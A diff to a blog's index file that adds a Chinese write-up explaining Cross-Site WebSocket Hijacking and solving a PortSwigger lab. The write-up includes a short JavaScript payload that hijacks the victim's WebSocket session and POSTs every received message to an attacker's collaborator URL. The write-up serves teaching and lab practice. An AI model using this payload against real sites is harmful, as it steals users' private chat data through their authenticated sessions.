@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>前端websocket劫持漏洞(CSWSH)</title>
+      <link href="/2023/01/28/%E5%89%8D%E7%AB%AFwebsocket%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E(CSWSH)/"/>
+      <url>/2023/01/28/%E5%89%8D%E7%AB%AFwebsocket%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E(CSWSH)/</url>
+      
+        <content type="html"><![CDATA[<span id="more"></span><h1 id="0x00-什么是ws劫持"><a href="#0x00-什么是ws劫持" class="headerlink" title="0x00 什么是ws劫持"></a>0x00 什么是ws劫持</h1><p>在Websocket的业务中，其中常见的漏洞是ws劫持，全称为跨站点CSWSH(Cross-Site WebSocket Hijacking)跨站WebSocket劫持漏洞。</p><h3 id="WebSocket概念"><a href="#WebSocket概念" class="headerlink" title="WebSocket概念"></a>WebSocket概念</h3><blockquote><p>WebSocket是通过HTTP启动的双向、全双工通信协议。它们通常用于流式传输数据和其他异步流量的现代Web应用程序中。最常见的是网站中的聊天机器人</p><p>有人要问了：那他和同为协议的且使用更普遍的HTTP协议有什么区别呢？</p><p>首先呢WebSocket是HTML5推出的新协议，是基于TCP的应用层通信协议，它与http协议内容本身没有关系。</p><p>同时WebSocket 也类似于 TCP 一样进行握手连接，跟 TCP 不同的是，WebSocket 是基于 HTTP 协议进行的握手，它在客户端和服务器之间提供了一个基于单 TCP 连接的高效全双工通信信道</p><p>WebSocket连接是通过HTTP发起，通常是长期存在的。消息可以随时向任何一个方向发送，并且本质上不是事务性的。连接通常保持打开和空闲状态，直到客户端或服务器发送消息。</p></blockquote><p>简单的说，就是http是无状态的，发送完了就结束了。</p><p>WebSocket是一个长期连接，可以一直交互的协议，遇到这种需要频繁交互，长期交互的，这个就比较适合。还有一种在线游戏，服务器主动给你不断发消息这种，也适用。（需要长轮询这种）</p><p>只是一个不同的协议。</p><h1 id="0x01-漏洞特点"><a href="#0x01-漏洞特点" class="headerlink" title="0x01 漏洞特点"></a>0x01 漏洞特点</h1><ul><li>**前提：**当 WebSocket 握手请求仅依赖 HTTP cookie 进行会话处理，并且没有CSRF 令牌时</li></ul><p>攻击者可以在自己构建一个恶意连接，对应用程序建立跨站点 WebSocket 连接，随后受害者将会与应用程序的会话上下文中处理连接，随之连接向服务器发送任意消息，并读取从服务器收到的消息内容。</p><ul><li><p>**不同：**攻击者获得与受感染应用程序的双向交互</p></li><li><p>伪装成受害用户做敏感操作。</p></li><li><p>被劫持的应用程序可以进行双向交互。</p></li></ul><h1 id="0x02-实验"><a href="#0x02-实验" class="headerlink" title="0x02 实验"></a>0x02 实验</h1><p>为了简单方便，我们直接钱使用 burp的在线靶场即可</p><p><a href="https://0aa000f704fed249c17a6c3e00220075.web-security-academy.net/chat">https://0aa000f704fed249c17a6c3e00220075.web-security-academy.net/chat</a></p><p>这个是我的地址，大家自己去官网，找那个 Cross-site WebSocket hijacking 实验环境即可</p><h3 id="1-这是一个在线商城，有一个聊天机器人"><a href="#1-这是一个在线商城，有一个聊天机器人" class="headerlink" title="1.这是一个在线商城，有一个聊天机器人"></a>1.这是一个在线商城，有一个聊天机器人</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/b25f03208f1db15f0e8b6fbe470b0a41.png" alt="image-20230128160750934"></p><h3 id="2-抓包看一下，使用的-WebSocket通信"><a href="#2-抓包看一下，使用的-WebSocket通信" class="headerlink" title="2.抓包看一下，使用的 WebSocket通信"></a>2.抓包看一下，使用的 WebSocket通信</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/aa1b39bb79e795449c8f6159683f0275.png" alt="image-20230128160836959"></p><p>这里有一个问题，在WebSockets历史里，观察到 “READY “有命令就会全部重新请求一遍过去的全部聊天信息。</p><p>在HTTP历史中，找到WebSocket握手请求。观察一下，该请求没有CSRF令牌。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/dc72cb05a2b2e319b0edaff137b4b21b.png" alt="image-20230128161334549"></p><p>那么我们就可以试一下这个CSWSH漏洞，下面是我的聊天地址</p><p><a href="https://0aa000f704fed249c17a6c3e00220075.web-security-academy.net/chat">https://0aa000f704fed249c17a6c3e00220075.web-security-academy.net/chat</a></p><h3 id="3-我们需要一个服务放我们的脚本，直接理解为XSS平台，那这边lab提供了一个sever"><a href="#3-我们需要一个服务放我们的脚本，直接理解为XSS平台，那这边lab提供了一个sever" class="headerlink" title="3.我们需要一个服务放我们的脚本，直接理解为XSS平台，那这边lab提供了一个sever"></a>3.我们需要一个服务放我们的脚本，直接理解为XSS平台，那这边lab提供了一个sever</h3><p>把js脚本写好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var ws = new WebSocket(&#x27;wss://your-websocket-url&#x27;);</span><br><span class="line">    ws.onopen = function() &#123;</span><br><span class="line">        ws.send(&quot;READY&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line">    ws.onmessage = function(event) &#123;</span><br><span class="line">        fetch(&#x27;https://your-collaborator-url&#x27;, &#123;method: &#x27;POST&#x27;, mode: &#x27;no-cors&#x27;, body: event.data&#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/c18c48bcb8eb6b8c02d1f86c5d29374e.png" alt="image-20230128163151580"></p><h3 id="4-然后相当于去访问这个有-js的url"><a href="#4-然后相当于去访问这个有-js的url" class="headerlink" title="4.然后相当于去访问这个有 js的url"></a>4.然后相当于去访问这个有 js的url</h3><p><img src="https://img-blog.csdnimg.cn/img_convert/7f92b6ccfed2588d0470c4d2a76f0926.png" alt="image-20230128163235167"></p><h3 id="5-收到消息"><a href="#5-收到消息" class="headerlink" title="5.收到消息"></a>5.收到消息</h3><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-8YWG3uPW-1674896334764)(&#x2F;Users&#x2F;zy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230128163444180.png)]</p><p>这样就可以看到聊天记录的交互信息，算是劫持成功.</p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>其实简单的将，这个很类与websocket版本的CSRF，同样的需要没有CSRF的token,然后利用这一点，发送一下敏感的请求，做一些敏感操作。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WEB 漏洞复现和分析 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 前端 websocket 网络协议 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>应急/linux 挂D盾扫描方法</title>
       <link href="/2023/01/02/%E5%BA%94%E6%80%A5!linux%20%E6%8C%82D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95/"/>
       <url>/2023/01/02/%E5%BA%94%E6%80%A5!linux%20%E6%8C%82D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95/</url>
